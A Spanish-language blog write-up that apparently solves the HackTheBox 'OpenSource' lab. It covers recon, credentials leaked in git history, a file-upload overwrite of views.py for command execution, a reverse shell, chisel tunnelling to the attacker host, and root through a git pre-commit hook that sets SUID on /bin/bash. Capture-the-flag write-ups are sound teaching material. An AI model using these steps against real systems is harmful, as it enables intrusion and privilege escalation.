---
layout:   post
title:    "Write Up OpenSource. "
subtitle: "Starting-Point"
category:   HTB
tags:      [Easy,Linux,Burpsuite,pspy64,RCE,SSTI,XXE,Write-Up-Machine,Starting-Point] 
---
![list](/assets/img/opensource/opensource.png){:.lead width="800" height="100" loading="lazy"}

***
<!--more-->

1. this ordered seed list will be replaced by the toc
{:toc}

***

## Reconocimiento

Fase inicial donde recolectamos toda la información posible del objetivo, 

utilizando diferentes técnicas como:

| Caracter.                                   |
|:--------------------------------------------|
|Recopilación de tecnologuias.                |
|Dominios.                                    |
|IPs.                                         |
|Puertos.                                     |
|Servicios.                                   |
|Recopilación de metadatos, etc.              |


***
### nmap

Utizando nmap comprobamos que puertos estan abiertos.


```bash
nmap -p- --open --min-rate 5000 -n -vvv -Pn 10.10.11.164 -oA allports
```
El paso anterior se debe hacer con privileguios (root).
{:.note title="Attention"}


![list](/assets/img/opensource/Parrot-SO3-2022-08-24-16-10-05.png){:.lead width="800" height="100" loading="lazy"}

***
### Servicios y versiones

Una vez sabemos que puertos estan abiertos con el comandoa anterior debemos saber que 

versiones y servicios que corren en los mismo de ahi podremos determinara posibles 

vulnerabilidades.

Esto lo hacemos con el siguiente comando.


```bash
nmap -p22,8080 -sV -sC 10.10.11.170 -oN target
```

El paso anterior no es nesesario ser (root).
{:.note title="Attention"}


***

## Analisis de vulnerabilidades

Uso de Investigacion web, Google Hacking,Google Dorks.

Recopilación de información gracias a servicios de terceros.

Ispeccionamos la web.

Inpeccionamos las tecnologias de la ip ataves de la terminal o via  web esto lo 

hacemos con wapalizzer o whatweb.


![list](/assets/img/opensource/Parrot-SO3-2022-08-24-16-07-07.png){:.lead width="800" height="100" loading="lazy"}

En una seccion de la web podemos cargar un archivo. 
{:.note}

Whatweb identificar tecnologuias atraves del terminal o wappalizer atraves de la web.

![list](/assets/img/opensource/Parrot-SO3-2022-08-24-16-06-20.png){:.lead width="800" height="100" loading="lazy"}

Nos descargamos el codigo fuente que encontramos al inspeccionar la web.

![list](/assets/img/opensource/1.png){:.lead width="800" height="100" loading="lazy"}

Descomprimimos el zip y encontramos que hay un directorio .git, y buscando entre branchs y 

commits encontramos credenciales.

![list](/assets/img/opensource/Kali-2022-08-25-16-22-37.png){:.lead width="800" height="100" loading="lazy"}

Encontramos una credencial `dev01:Soulless_Developer#2022`. 
{:.note}

Si seguimos mirando en app/app/ hay un archivo views.py que es el que almacena las funciones.

Guindonos por las funciones de arriba podemos definir nuestra propia función y agregarla al 

final para mas adelante subirla y ejecutar comandos.

![list](/assets/img/opensource/Parrot-SO3-2022-08-24-17-48-36.png){:.lead width="800" height="100" loading="lazy"}

De esta forma  podremos ver el /etc/host y tambien el /.ssh/id_rsa. 
{:.note}

Lo subimos desde `http://10.10.11.164/upload` pero interceptaremos con burpsuite y cambiaremos 

la ruta a `/app/app/views.py` para sobreescribir el actual de la máquina y damos a forward.

![list](/assets/img/opensource/Parrot-SO3-2022-08-24-18-54-52.png){:.lead width="800" height="100" loading="lazy"}

{:.note}
Si todo salió bien la función deberia de funcionar entonces nos haremos una reverse shell con 

`nc mkfifo`, urlencodeando lo que pueda dar problemas,levantamos un listener en el puerto 443.


Tenenos shell como root en un contenedor, pero ahora tenemos conexión con el puerto 3000 de la 

maquina real que veiamos filtered, asi que subiremos chisel y enviaremos el puerto a nuestro 

equipo local.

```bash
chisel server --reverse --port 8000
```

Esto en la maquina atacante.
{:.note}


```bash
./chisel client 10.10.16.31:8000 R:3000:172.17.0.1:3000
```

Esto en la maquina victima.
{:.note}

Si abrimos en el navegador el localhost en el puerto 3000 vemos un panel de gitea podemos 

usar las credenciales que encontramos al inicio `dev01:Soulless_Developer#2022`.

{:.note}
Ya como dev01 podemos ver un repositorio "home-backup" que tiene unas claves ssh que 

podemos probar para conectarnos.

![list](/assets/img/opensource/Kali-2022-08-25-16-37-32.png){:.lead width="800" height="100" loading="lazy"}

Buscamos la flag de en el escritorio.
{:.note}

***
## Explotacion

Siempre es bueno ejecutar `LimEnum` Y `pspy` para monitorizar y ver los posibles 

vectores para escalar de privilegios, ademas hasta que se ejecute los anteriores 

podemos buscar los permisos con el comado find con el siguite comado.


En [gtfobins] vemos un ejemplo abusando del pre-commit, podemos intentarlo y después 

de un minuto nos convertimos en root.

[gtfobins]: https://gtfobins.github.io/gtfobins/git/

```bash
echo "chmod u+s /bin/bash" >> ~/.git/hooks/pre-commit
```

Le damos permiso setuid.
{:.note}

```bash
chmod +x !$
```

Le damos permisos de ejecucion.
{:.note}

```bash
bash -p
```

Ya somos root, buscamos la flag en el escritorio del root.
{:.note}

***

```shell
🎉 Felicitaciones ya has comprometido OpenSource de HackTheBox 🎉
```
{:.centered}
***
